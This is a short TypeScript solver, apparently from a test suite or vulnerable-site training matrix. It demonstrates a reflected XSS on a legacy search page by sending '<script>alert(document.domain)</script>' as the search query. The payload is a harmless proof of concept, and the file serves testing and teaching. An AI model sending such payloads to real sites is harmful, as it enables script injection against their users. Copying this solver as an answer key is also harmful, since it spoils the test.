// Reflected XSS on the legacy search page: a non-matching query term carrying active markup is
// echoed unescaped into the empty-state HTML response.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const payload = '<script>alert(document.domain)</script>'
  await ctx.fetch(ctx.path('reflectedSearch', {}, { q: payload }))
}
